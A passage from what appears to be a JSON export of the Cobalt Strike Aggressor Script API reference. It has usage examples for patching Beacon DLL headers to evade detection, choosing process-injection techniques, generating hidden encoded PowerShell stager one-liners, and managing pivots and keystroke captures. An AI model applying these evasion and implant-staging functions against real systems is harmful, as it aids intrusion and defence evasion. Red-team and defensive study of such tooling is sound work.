    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n\n# ===========================================================================\nsub demo_pe_patch_code {\n\nlocal('$temp_dll, $findme, $replacement');\n\n$temp_dll = $1;\n\n# ====== simple text values ======\n$findme = \"abcABC123\";\n$replacement = \"123ABCabc\";\n\n# warn(\"pe_patch_code(dll, \" . $findme . \", \" . $replacement . \")\");\n$temp_dll = pe_patch_code($temp_dll, $findme, $replacement);\n\n# ====== byte array as a hex string ======\n$findme = \"\\x01\\x02\\x03\\xfc\\xfe\\xff\";\n$replacement = \"\\x01\\x02\\x03\\xfc\\xfe\\xff\";\n\n# warn(\"pe_patch_code(dll, \" . $findme . \", \" . $replacement . \")\");\n$temp_dll = pe_patch_code($temp_dll, $findme, $replacement);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_patch_code",
    "anchors": [
      "pe_patch_code"
    ]
  },
  "pe_remove_rich_header": {
    "description": "Remove the rich header from Beacon DLL Content.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# -------------------------------------\n# Remove/Replace Rich Header\n# -------------------------------------\n$temp_dll = pe_remove_rich_header($temp_dll);",
    "notes": "",
    "signature": "pe_remove_rich_header",
    "anchors": [
      "pe_remove_rich_header"
    ]
  },
  "pe_set_compile_time_with_long": {
    "description": "Set the compile time in the Beacon DLL Content.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Compile Time (as a long in milliseconds)"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# date is in milliseconds (\"1893521594000\" = \"01 Jan 2030 12:13:14\")\n$date = 1893521594000;\n$temp_dll = pe_set_compile_time_with_long($temp_dll, $date);\n\n# date is in milliseconds (\"1700000001000\" = \"14 Nov 2023 16:13:21\")\n$date = 1700000001000;\n$temp_dll = pe_set_compile_time_with_long($temp_dll, $date);",
    "notes": "",
    "signature": "pe_set_compile_time_with_long",
    "anchors": [
      "pe_set_compile_time_with_long"
    ]
  },
  "pe_set_compile_time_with_string": {
    "description": "Set the compile time in the Beacon DLL Content.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Compile Time (as a string)"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# (\"01 Jan 2020 15:16:17\" = \"1577913377000\")\n$strTime = \"01 Jan 2020 15:16:17\";\n$temp_dll = pe_set_compile_time_with_string($temp_dll, $strTime);",
    "notes": "",
    "signature": "pe_set_compile_time_with_string",
    "anchors": [
      "pe_set_compile_time_with_string"
    ]
  },
  "pe_set_export_name": {
    "description": "Set the export name in the Beacon DLL Content.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# -------------------------------------\n# name must be in strings table...\n# -------------------------------------\n$export_name = \"WININET.dll\";\n$temp_dll = pe_set_export_name($temp_dll, $export_name);\n\n$export_name = \"beacon.dll\";\n$temp_dll = pe_set_export_name($temp_dll, $export_name);",
    "notes": "The name must exist in the string table.",
    "signature": "pe_set_export_name",
    "anchors": [
      "pe_set_export_name"
    ]
  },
  "pe_set_long": {
    "description": "Places a long value at a specified location.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Location"
      },
      {
        "param": "$3",
        "desc": "Value"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_set_long {\n\nlocal('$temp_dll, $int_offset, $long_value');\nlocal('%pemap');\nlocal('@loc_cs, @val_cs');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc_cs = values(%pemap, @(\"CheckSum.<location>\"));\n@val_cs = values(%pemap, @(\"CheckSum.<value>\"));\n\nif (size(@val_cs) != 1) {\nwarn(\"Unexpected size of checksum value array: \" . size(@val_cs));\n} else {\nwarn(\"Current checksum value: \" . @val_cs[0]);\n}\n\nif (size(@loc_cs) != 1) {\nwarn(\"Unexpected size of checksum location array: \" . size(@loc_cs));\n} else {\nwarn(\"Current checksum location: \" . @loc_cs[0]);\n}\n\n# -------------------------------------\n# Set parameters (parse number as base 10)\n# -------------------------------------\n$int_offset = parseNumber(@loc_cs[0], 10);\n$long_value = 98765;\n\n# -------------------------------------\n# pe_set_long (set a long value)\n# -------------------------------------\n# warn(\"pe_set_long(dll, \" . $int_offset . \", \" . $long_value . \")\");\n$temp_dll = pe_set_long($temp_dll, $int_offset, $long_value);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_set_long",
    "anchors": [
      "pe_set_long"
    ]
  },
  "pe_set_short": {
    "description": "Places a short value at a specified location.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Location"
      },
      {
        "param": "$3",
        "desc": "Value"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_set_short {\n\nlocal('$temp_dll, $int_offset, $short_value');\nlocal('%pemap');\nlocal('@loc, @val');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc = values(%pemap, @(\".text.NumberOfRelocations.\"));\n@val = values(%pemap, @(\".text.NumberOfRelocations.\"));\n\nif (size(@val) != 1) {\nwarn(\"Unexpected size of .text.NumberOfRelocations value array: \" . size(@val));\n} else {\nwarn(\"Current .text.NumberOfRelocations value: \" . @val[0]);\n}\n\nif (size(@loc) != 1) {\nwarn(\"Unexpected size of .text.NumberOfRelocations location array: \" . size(@loc));\n} else {\nwarn(\"Current .text.NumberOfRelocations location: \" . @loc[0]);\n}\n\n# -------------------------------------\n# Set parameters (parse number as base 10)\n# -------------------------------------\n$int_offset = parseNumber(@loc[0], 10);\n$short_value = 128;\n\n# -------------------------------------\n# pe_set_short (set a short value)\n# -------------------------------------\n# warn(\"pe_set_short(dll, \" . $int_offset . \", \" . $short_value . \")\");\n$temp_dll = pe_set_short($temp_dll, $int_offset, $short_value);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_set_short",
    "anchors": [
      "pe_set_short"
    ]
  },
  "pe_set_string": {
    "description": "Places a string value at a specified location.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Start location"
      },
      {
        "param": "$3",
        "desc": "Value"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_set_string {\n\nlocal('$temp_dll, $location, $value');\nlocal('%pemap');\nlocal('@loc_en, @val_en');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc_en = values(%pemap, @(\"Export.Name.\"));\n@val_en = values(%pemap, @(\"Export.Name.\"));\n\nif (size(@val_en) != 1) {\nwarn(\"Unexpected size of export name value array: \" . size(@val_en));\n} else {\nwarn(\"Current export value: \" . @val_en[0]);\n}\n\nif (size(@loc_en) != 1) {\nwarn(\"Unexpected size of export location array: \" . size(@loc_en));\n} else {\nwarn(\"Current export name location: \" . @loc_en[0]);\n}\n\n# -------------------------------------\n# Set parameters (parse number as base 10)\n# -------------------------------------\n$location = parseNumber(@loc_en[0], 10);\n$value = \"BEECON.DLL\";\n\n# -------------------------------------\n# pe_set_string (set a string value)\n# -------------------------------------\n# warn(\"pe_set_string(dll, \" . $location . \", \" . $value . \")\");\n$temp_dll = pe_set_string($temp_dll, $location, $value);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_set_string",
    "anchors": [
      "pe_set_string"
    ]
  },
  "pe_set_stringz": {
    "description": "Places a string value at a specified location and adds a zero terminator.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Start location"
      },
      {
        "param": "$3",
        "desc": "String to set"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_set_stringz {\n\nlocal('$temp_dll, $offset, $value');\nlocal('%pemap');\nlocal('@loc');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc = values(%pemap, @(\"Sections.AddressOfName.0.\"));\n\nif (size(@loc) != 1) {\nwarn(\"Unexpected size of section name location array: \" . size(@loc));\n} else {\nwarn(\"Current section name location: \" . @loc[0]);\n}\n\n# -------------------------------------\n# Set parameters (parse number as base 10)\n# -------------------------------------\n$offset = parseNumber(@loc[0], 10);\n$value = \"abc\";\n\n# -------------------------------------\n# pe_set_stringz\n# -------------------------------------\n# warn(\"pe_set_stringz(dll, \" . $offset . \", \" . $value . \")\");\n$temp_dll = pe_set_stringz($temp_dll, $offset, $value);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# Set parameters\n# -------------------------------------\n# $offset = parseNumber(@loc[0], 10);\n# $value = \".tex\";\n\n# -------------------------------------\n# pe_set_string (set a string value)\n# -------------------------------------\n# warn(\"pe_set_string(dll, \" . $offset . \", \" . $value . \")\");\n# $temp_dll = pe_set_string($temp_dll, $offset, $value);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_set_stringz",
    "anchors": [
      "pe_set_stringz"
    ]
  },
  "pe_set_value_at": {
    "description": "Sets a long value based on the location resolved by a name from the PE Map (see pedump).",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Name of location field"
      },
      {
        "param": "$3",
        "desc": "Value"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = DLL content\n# ===========================================================================\nsub demo_pe_set_value_at {\n\nlocal('$temp_dll, $name, $long_value, $date');\nlocal('%pemap');\nlocal('@loc, @val');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n# %pemap = pedump($temp_dll);\n# @loc = values(%pemap, @(\"SizeOfImage.\"));\n# @val = values(%pemap, @(\"SizeOfImage.\"));\n\n# if (size(@val) != 1) {\n# warn(\"Unexpected size of SizeOfImage. value array: \" . size(@val));\n# } else {\n# warn(\"Current SizeOfImage. value: \" . @val[0]);\n# }\n\n# if (size(@loc) != 1) {\n# warn(\"Unexpected size of SizeOfImage location array: \" . size(@loc));\n# } else {\n# warn(\"Current SizeOfImage. location: \" . @loc[0]);\n# }\n\n# -------------------------------------\n# Set parameters\n# -------------------------------------\n$name = \"SizeOfImage\";\n$long_value = 22334455;\n\n# -------------------------------------\n# pe_set_value_at (set a long value at the location resolved by name)\n# -------------------------------------\n# $1 = DLL (byte array)\n# $2 = name (string)\n# $3 = value (long)\n# -------------------------------------\nwarn(\"pe_set_value_at(dll, \" . $name . \", \" . $long_value . \")\");\n$temp_dll = pe_set_value_at($temp_dll, $name, $long_value);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# set it back?\n# -------------------------------------\n# warn(\"pe_set_value_at(dll, \" . $name . \", \" . @val[0] . \")\");\n# $temp_dll = pe_set_value_at($temp_dll, $name, @val[0]);\n\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_set_value_at",
    "anchors": [
      "pe_set_value_at"
    ]
  },
  "pe_stomp": {
    "description": "Set a string to null characters. Start at a specified location and sets all characters to null until a null string terminator is reached.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      },
      {
        "param": "$2",
        "desc": "Start location"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# ===========================================================================\n# $1 = Beacon DLL content\n# ===========================================================================\nsub demo_pe_stomp {\n\nlocal('$temp_dll, $offset, $value, $old_name');\nlocal('%pemap');\nlocal('@loc, @val');\n\n$temp_dll = $1;\n\n# -------------------------------------\n# Inspect the current DLL...\n# -------------------------------------\n%pemap = pedump($temp_dll);\n@loc = values(%pemap, @(\"Sections.AddressOfName.1.\"));\n@val = values(%pemap, @(\"Sections.AddressOfName.1.\"));\n\nif (size(@val) != 1) {\nwarn(\"Unexpected size of Sections.AddressOfName.1 value array: \" . size(@val));\n} else {\nwarn(\"Current Sections.AddressOfName.1 value: \" . @val[0]);\n}\n\nif (size(@loc) != 1) {\nwarn(\"Unexpected size of Sections.AddressOfName.1 location array: \" . size(@loc));\n} else {\nwarn(\"Current Sections.AddressOfName.1 location: \" . @loc[0]);\n}\n\n# -------------------------------------\n# Set parameters (parse number as base 10)\n# -------------------------------------\n$location = parseNumber(@loc[0], 10);\n\n# -------------------------------------\n# pe_stomp (stomp a string at a location)\n# -------------------------------------\n# warn(\"pe_stomp(dll, \" . $location . \")\");\n$temp_dll = pe_stomp($temp_dll, $location);\n\n# -------------------------------------\n# Did it work?\n# -------------------------------------\n# dump_my_pe($temp_dll);\n\n# -------------------------------------\n# All Done! Give back edited DLL!\n# -------------------------------------\nreturn $temp_dll;\n}",
    "notes": "",
    "signature": "pe_stomp",
    "anchors": [
      "pe_stomp"
    ]
  },
  "pe_update_checksum": {
    "description": "Update the checksum in the Beacon DLL Content.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      }
    ],
    "returns": "Updated DLL Content",
    "example": "# -------------------------------------\n# update checksum\n# -------------------------------------\n$temp_dll = pe_update_checksum($temp_dll);",
    "notes": "This should be the last transformation performed.",
    "signature": "pe_update_checksum",
    "anchors": [
      "pe_update_checksum"
    ]
  },
  "pedump": {
    "description": "Parse an executable Beacon into a map of the PE Header information. The parsed information can be used for research or programmatically to make changes to the Beacon.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Beacon DLL content"
      }
    ],
    "returns": "A map of the parsed information. The map data is very similar to the \"./peclone dump [file]\" command output.",
    "example": "# ===========================================================================\n# 'case insensitive sort' from sleep manual...\n# ===========================================================================\nsub caseInsensitiveCompare\n{\n$a = lc($1);\n$b = lc($2);\nreturn $a cmp $b;\n}\n\n# ===========================================================================\n# Dump PE Information\n# $1 = Beacon DLL content\n# ===========================================================================\nsub dump_my_pe {\nlocal('$out $key $val %pemap @sorted_keys');\n\n%pemap = pedump($1);\n\n# ---------------------------------------------------\n# Example listing all items from hash/map...\n# ---------------------------------------------------\n@sorted_keys = sort(&caseInsensitiveCompare, keys(%pemap));\nforeach $key (@sorted_keys)\n{\n$out = \"$[50]key\";\nforeach $val (values(%pemap, @($key)))\n{\n$out .= \" $val\";\nprintln($out);\n}\n}\n\n# ---------------------------------------------------\n# Example of grabbing specific items from hash/map...\n# ---------------------------------------------------\nlocal('@loc_cs @val_cs');\n@loc_cs = values(%pemap, @(\"CheckSum.<location>\"));\n@val_cs = values(%pemap, @(\"CheckSum.<value>\"));\n\nprintln(\"\");\nprintln(\"My DLL CheckSum Location: \" . @loc_cs);\nprintln(\"My DLL CheckSum Value: \" . @val_cs);\nprintln(\"\");\n}\n\nSee also\n\n./peclone dump [file]",
    "notes": "",
    "signature": "pedump",
    "anchors": [
      "pedump"
    ]
  },
  "pgraph": {
    "description": "Generate the pivot graph GUI component.",
    "arguments": [],
    "returns": "The pivot graph GUI object (a javax.swing.JComponent)",
    "example": "addVisualization(\"Pivot Graph\", pgraph());\n\nSee also\n\n&showVisualization",
    "notes": "",
    "signature": "pgraph",
    "anchors": [
      "pgraph"
    ]
  },
  "pivots": {
    "description": "Returns a list of SOCKS pivots from Cobalt Strike's data model.",
    "arguments": [],
    "returns": "An array of dictionary objects with information about each pivot.",
    "example": "printAll(pivots());",
    "notes": "",
    "signature": "pivots",
    "anchors": [
      "pivots"
    ]
  },
  "pi_explicit_get": {
    "description": "Gets the active selection for built-in explicit injection.",
    "arguments": [],
    "returns": "A string name of the selected built-in explicit injection.",
    "example": "println(pi_explicit_get());",
    "notes": "",
    "signature": "pi_explicit_get",
    "anchors": [
      "pi_explicit_get"
    ]
  },
  "pi_explicit_info": {
    "description": "Get a list of all built-in explicit injections available.",
    "arguments": [],
    "returns": "An array containing the names of all built-in explicit injections available.",
    "example": "println(pi_explicit_info());",
    "notes": "",
    "signature": "pi_explicit_info",
    "anchors": [
      "pi_explicit_info"
    ]
  },
  "pi_explicit_set": {
    "description": "Sets the active selection for explicit injection",
    "arguments": [
      {
        "param": "$1",
        "desc": "Name of the built-in explicit injection"
      }
    ],
    "returns": "",
    "example": "pi_explicit_set(\"TpDirect\");",
    "notes": "",
    "signature": "pi_explicit_set",
    "anchors": [
      "pi_explicit_set"
    ]
  },
  "pi_spawn_get": {
    "description": "Gets the active selection for built-in spawn injection.",
    "arguments": [],
    "returns": "A string name of the selected built-in spawn injection.",
    "example": "println(pi_spawn_get());",
    "notes": "",
    "signature": "pi_spawn_get",
    "anchors": [
      "pi_spawn_get"
    ]
  },
  "pi_spawn_info": {
    "description": "Get a list of all built-in spawn injections available.",
    "arguments": [],
    "returns": "An array containing the names of all built-in spawn injections available.",
    "example": "println(pi_spawn_info());",
    "notes": "",
    "signature": "pi_spawn_info",
    "anchors": [
      "pi_spawn_info"
    ]
  },
  "pi_spawn_set": {
    "description": "Sets the active selection for spawn injection",
    "arguments": [
      {
        "param": "$1",
        "desc": "Name of the built-in spawn injection"
      }
    ],
    "returns": "",
    "example": "pi_spawn_set(\"Early Cascade\");",
    "notes": "",
    "signature": "pi_spawn_set",
    "anchors": [
      "pi_spawn_set"
    ]
  },
  "pi_user_explicit_clear": {
    "description": "Clears the active user-defined explicit injection. Use this to revert to built-in explicit injections.",
    "arguments": [],
    "returns": "",
    "example": "pi_user_explicit_clear();",
    "notes": "",
    "signature": "pi_user_explicit_clear",
    "anchors": [
      "pi_user_explicit_clear"
    ]
  },
  "pi_user_spawn_clear": {
    "description": "Clears the active user-defined spawn injection. Use this to revert to built-in spawn injections.",
    "arguments": [],
    "returns": "",
    "example": "pi_user_spawn_clear();",
    "notes": "",
    "signature": "pi_user_spawn_clear",
    "anchors": [
      "pi_user_spawn_clear"
    ]
  },
  "pi_user_explicit_get": {
    "description": "gets the 'Name' for the actively selected user-defined explicit injection.",
    "arguments": [],
    "returns": "A string name of the selected user-defined explicit injection. Null if no user-defined selection is currently selected.",
    "example": "println(pi_user_explicit_get());",
    "notes": "",
    "signature": "pi_user_explicit_get",
    "anchors": [
      "pi_user_explicit_get"
    ]
  },
  "pi_user_explicit_get_map": {
    "description": "Gets the map of all available user-defined explicit injections and their paths.",
    "arguments": [],
    "returns": "",
    "example": "println(pi_user_explicit_get_map());",
    "notes": "",
    "signature": "pi_user_explicit_get_map",
    "anchors": [
      "pi_user_explicit_get_map"
    ]
  },
  "pi_user_explicit_get_names": {
    "description": "Gets a list of all available user-defined explicit injection 'Names'.",
    "arguments": [],
    "returns": "",
    "example": "println(pi_user_explicit_get_names());",
    "notes": "",
    "signature": "pi_user_explicit_get_names",
    "anchors": [
      "pi_user_explicit_get_names"
    ]
  },
  "pi_user_explicit_set": {
    "description": "Sets the 'Name' for the actively selected user-defined explicit injection. User-defined explicit injections supersede built-in explicit injection selections.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Name of the user-defined explicit injection. This injection must have been added to the map of available explicit injections via the PROCESS_INJECT_EXPLICIT_USER hook."
      }
    ],
    "returns": "",
    "example": "pi_user_explicit_set(\"MyFavoriteExplicitInjection-x64\");",
    "notes": "",
    "signature": "pi_user_explicit_set",
    "anchors": [
      "pi_user_explicit_set"
    ]
  },
  "pi_user_spawn_get": {
    "description": "gets the 'Name' for the actively selected user-defined spawn injection",
    "arguments": [],
    "returns": "A string name of the selected user-defined spawn injection. Null if no user-defined selection is currently selected.",
    "example": "println(pi_user_spawn_get());",
    "notes": "",
    "signature": "pi_user_spawn_get",
    "anchors": [
      "pi_user_spawn_get"
    ]
  },
  "pi_user_spawn_get_map": {
    "description": "Gets the map of all available user-defined spawn injections and their paths.",
    "arguments": [],
    "returns": "",
    "example": "println(pi_user_spawn_get_map());",
    "notes": "",
    "signature": "pi_user_spawn_get_map",
    "anchors": [
      "pi_user_spawn_get_map"
    ]
  },
  "pi_user_spawn_get_names": {
    "description": "Gets a list of all available user-defined spawn injection 'Names'.",
    "arguments": [],
    "returns": "",
    "example": "println(pi_user_spawn_get_names());",
    "notes": "",
    "signature": "pi_user_spawn_get_names",
    "anchors": [
      "pi_user_spawn_get_names"
    ]
  },
  "pi_user_spawn_set": {
    "description": "Sets the 'Name' for the actively selected user-defined spawn injection. User-defined spawn injections supersede built-in spawn injection selections.",
    "arguments": [
      {
        "param": "$1",
        "desc": "Name of the user-defined spawn injection. This injection must have been added to the map of available explicit injections via the PROCESS_INJECT_SPAWN_USER hook."
      }
    ],
    "returns": "",
    "example": "pi_user_spawn_set(\"MyFavoriteSpawnInjection-x64\");",
    "notes": "",
    "signature": "pi_user_spawn_set",
    "anchors": [
      "pi_user_spawn_set"
    ]
  },
  "popup_clear": {
    "description": "Remove all popup menus associated with the current menu. This is a way to override Cobalt Strike's default popup menu definitions.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the popup hook to clear registered menus for"
      }
    ],
    "returns": "",
    "example": "popup_clear(\"help\");\n\npopup help {\nitem \"My stuff!\" {\nshow_message(\"This is my menu!\");\n}\n}",
    "notes": "",
    "signature": "popup_clear",
    "anchors": [
      "popup_clear"
    ]
  },
  "powershell": {
    "description": "DEPRECATED This function is deprecated in Cobalt Strike 4.0. Use &artifact_stager and &powershell_command instead.\n\nReturns a PowerShell one-liner to bootstrap the specified listener.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the listener name"
      },
      {
        "param": "$2",
        "desc": "[true/false]: is this listener targeting local host?"
      },
      {
        "param": "$3",
        "desc": "x86|x64 - the architecture of the generated stager."
      }
    ],
    "returns": "A PowerShell one-liner to run the specified listener.",
    "example": "println(powershell(\"my-listener\", false));",
    "notes": "Be aware that not all listener configurations have x64 stagers. If in doubt, use x86.",
    "signature": "powershell",
    "anchors": [
      "powershell"
    ]
  },
  "powershell_command": {
    "description": "Returns a one-liner to run a PowerShell expression (e.g., powershell.exe -nop -w hidden -encodedcommand MgAgACsAIAAyAA==)",
    "arguments": [
      {
        "param": "$1",
        "desc": "the PowerShell expression to wrap into a one-liner."
      },
      {
        "param": "$2",
        "desc": "will the PowerShell command run on a remote target?"
      }
    ],
    "returns": "Returns a powershell.exe one-liner to run the specified expression.",
    "example": "$cmd = powershell_command(\"2 + 2\", false);\nprintln($cmd);",
    "notes": "",
    "signature": "powershell_command",
    "anchors": [
      "powershell_command"
    ]
  },
  "powershell_compress": {
    "description": "Compresses a PowerShell script and wraps it in a script to decompress and execute it.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the PowerShell script to compress."
      }
    ],
    "returns": "",
    "example": "$script = powershell_compress(\"2 + 2\");",
    "notes": "",
    "signature": "powershell_compress",
    "anchors": [
      "powershell_compress"
    ]
  },
  "pref_get": {
    "description": "Grabs a string value from Cobalt Strike's preferences.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the preference name"
      },
      {
        "param": "$2",
        "desc": "the default value [if there is no value for this preference]"
      }
    ],
    "returns": "A string with the preference value.",
    "example": "$foo = pref_get(\"foo.string\", \"bar\");",
    "notes": "",
    "signature": "pref_get",
    "anchors": [
      "pref_get"
    ]
  },
  "pref_get_list": {
    "description": "Grabs a list value from Cobalt Strike's preferences.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the preference name"
      }
    ],
    "returns": "An array with the preference values",
    "example": "@foo = pref_get_list(\"foo.list\");",
    "notes": "",
    "signature": "pref_get_list",
    "anchors": [
      "pref_get_list"
    ]
  },
  "pref_set": {
    "description": "Set a value in Cobalt Strike's preferences",
    "arguments": [
      {
        "param": "$1",
        "desc": "the preference name"
      },
      {
        "param": "$2",
        "desc": "the preference value"
      }
    ],
    "returns": "",
    "example": "pref_set(\"foo.string\", \"baz!\");",
    "notes": "",
    "signature": "pref_set",
    "anchors": [
      "pref_set"
    ]
  },
  "pref_set_list": {
    "description": "Stores a list value into Cobalt Strike's preferences.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the preference name"
      },
      {
        "param": "$2",
        "desc": "an array of values for this preference"
      }
    ],
    "returns": "",
    "example": "pref_set_list(\"foo.list\", @(\"a\", \"b\", \"c\"));",
    "notes": "",
    "signature": "pref_set_list",
    "anchors": [
      "pref_set_list"
    ]
  },
  "previousTab": {
    "description": "Activate the tab that is to the left of the current tab.",
    "arguments": [],
    "returns": "",
    "example": "bind Ctrl+Left {\npreviousTab();\n}",
    "notes": "",
    "signature": "previousTab",
    "anchors": [
      "previousTab"
    ]
  },
  "process_browser": {
    "description": "Opens the Process Browser. This function does not have any parameters.",
    "arguments": [],
    "returns": "",
    "example": "",
    "notes": "",
    "signature": "process_browser",
    "anchors": [
      "process_browser"
    ]
  },
  "privmsg": {
    "description": "Post a private message to a user in the event log",
    "arguments": [
      {
        "param": "$1",
        "desc": "who to send the message to"
      },
      {
        "param": "$2",
        "desc": "the message"
      }
    ],
    "returns": "",
    "example": "privmsg(\"raffi\", \"what's up man?\");",
    "notes": "",
    "signature": "privmsg",
    "anchors": [
      "privmsg"
    ]
  },
  "prompt_confirm": {
    "description": "Show a dialog with Yes/No buttons. If the user presses yes, call the specified function.",
    "arguments": [
      {
        "param": "$1",
        "desc": "text in the dialog"
      },
      {
        "param": "$2",
        "desc": "title of the dialog"
      },
      {
        "param": "$3",
        "desc": "a callback function. Called when the user presses yes."
      }
    ],
    "returns": "",
    "example": "prompt_confirm(\"Do you feel lucky?\", \"Do you?\", {\nshow_mesage(\"Ok, I got nothing\");\n});",
    "notes": "",
    "signature": "prompt_confirm",
    "anchors": [
      "prompt_confirm"
    ]
  },
  "prompt_directory_open": {
    "description": "Show a directory open dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "title of the dialog"
      },
      {
        "param": "$2",
        "desc": "default value"
      },
      {
        "param": "$3",
        "desc": "true/false: allow user to select multiple folders?"
      },
      {
        "param": "$4",
        "desc": "a callback function. Called when the user chooses a folder. The argument to the callback is the selected folder. If multiple folders are selected, they will still be specified as the first argument, separated by commas."
      }
    ],
    "returns": "",
    "example": "prompt_directory_open(\"Choose a folder\", $null, false, {\nshow_message(\"You chose: $1\");\n});",
    "notes": "",
    "signature": "prompt_directory_open",
    "anchors": [
      "prompt_directory_open"
    ]
  },
  "prompt_file_open": {
    "description": "Show a file open dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "title of the dialog"
      },
      {
        "param": "$2",
        "desc": "default value"
      },
      {
        "param": "$3",
        "desc": "true/false: allow user to select multiple files?"
      },
      {
        "param": "$4",
        "desc": "a callback function. Called when the user chooses a file to open. The argument to the callback is the selected file. If multiple files are selected, they will still be specified as the first argument, separated by commas."
      }
    ],
    "returns": "",
    "example": "prompt_file_open(\"Choose a file\", $null, false, {\nshow_message(\"You chose: $1\");\n});",
    "notes": "",
    "signature": "prompt_file_open",
    "anchors": [
      "prompt_file_open"
    ]
  },
  "prompt_file_save": {
    "description": "Show a file save dialog.",
    "arguments": [
      {
        "param": "$1",
        "desc": "default value"
      },
      {
        "param": "$2",
        "desc": "a callback function. Called when the user chooses a filename. The argument to the callback is the desired file."
      }
    ],
    "returns": "",
    "example": "prompt_file_save($null, {\nlocal('$handle');\n$handle = openf(\"> $+ $1\");\nprintln($handle, \"I am content\");\nclosef($handle);\n});",
    "notes": "",
    "signature": "prompt_file_save",
    "anchors": [
      "prompt_file_save"
    ]
  },
  "prompt_text": {
    "description": "Show a dialog that asks the user for text.",
    "arguments": [
      {
        "param": "$1",
        "desc": "text in the dialog"
      },
      {
        "param": "$2",
        "desc": "default value in the text field."
      },
      {
        "param": "$3",
        "desc": "a callback function. Called when the user presses OK. The first argument to this callback is the text the user provided."
      }
    ],
    "returns": "",
    "example": "prompt_text(\"What is your name?\", \"Cyber Bob\", {\nshow_mesage(\"Hi $1 $+ , nice to meet you!\");\n});",
    "notes": "",
    "signature": "prompt_text",
    "anchors": [
      "prompt_text"
    ]
  },
  "range": {
    "description": "Generate an array of numbers based on a string description of ranges.",
    "arguments": [
      {
        "param": "$1",
        "desc": "a string with a description of ranges"
      }
    ],
    "returns": "An array of numbers within the specified ranges.",
    "example": "printAll(range(\"2,4-6\"));",
    "notes": "",
    "signature": "range",
    "anchors": [
      "range"
    ]
  },
  "redactobject": {
    "description": "Removes a post-exploitation object (e.g., screenshot, keystroke buffer) from the user interface.",
    "arguments": [
      {
        "param": "$1",
        "desc": "the ID of the post-exploitation object."
      }
    ],
    "returns": "",
    "example": "",
    "notes": "",
